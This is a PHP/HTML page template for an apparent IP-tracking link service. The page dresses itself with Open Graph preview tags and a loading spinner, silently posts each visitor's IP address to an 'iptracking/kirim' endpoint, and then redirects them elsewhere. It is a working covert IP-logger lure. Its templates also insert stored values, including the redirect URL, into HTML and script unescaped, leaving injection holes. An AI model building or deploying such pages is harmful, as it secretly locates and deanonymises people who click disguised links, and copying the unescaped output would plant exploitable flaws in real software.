<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
    <meta name="description" content="<?=$data->deskripsi;?>">

    <meta property="og:title" content="<?= $data->judul; ?>">
    <meta property="og:description" content="<?= $data->deskripsi; ?>">
    <meta property="og:url" content="<?= base_url('gps/'.$data->id.'/'.$data->judul); ?>">
    <meta property="og:image:width" content="300">
    <meta property="og:image:height" content="300">
    <meta property="og:type" content="website" />

    <!-- Icon -->
    <title><?=$data->judul;?></title>
    <link rel="icon" href="<?=base_url('public/foto/'.$data->icon);?>">
    
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="<?=base_url('public/css/bootstrap.min.css');?>">
  </head>

  <body>
      <div class="d-flex justify-content-center">
        <div class="spinner-grow text-primary" role="status" style="margin-top:200px; width: 100px; height: 100px;">
            <span class="visually-hidden">Loading...</span>
        </div>
        </div>

<p id="demo"></p>
<input id="idd" type="hidden" name="id" value="<?=$data->id;?>">

<?php

 function ip()
{
  $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'IP tidak dikenali';
      return $ipaddress;
}

?>

<input id="ip" type="hidden" name="ip" value="<?=ip();?>">

 </body>

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="<?=base_url('public/js/bootstrap.bundle.min.js');?>"></script>
    <script type="text/javascript" src="<?=base_url('public/js/jquery.js');?>"></script>
     <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>

<script>
  function kirim()
  {
    var id = document.getElementById("idd").value;
    var ip = document.getElementById("ip").value;
    $.post("<?=base_url('iptracking/kirim');?>", {id:id, ip:ip});
    window.location.href = "<?=$data->redirect;?>";
  }
        
kirim();    
</script>
 </html>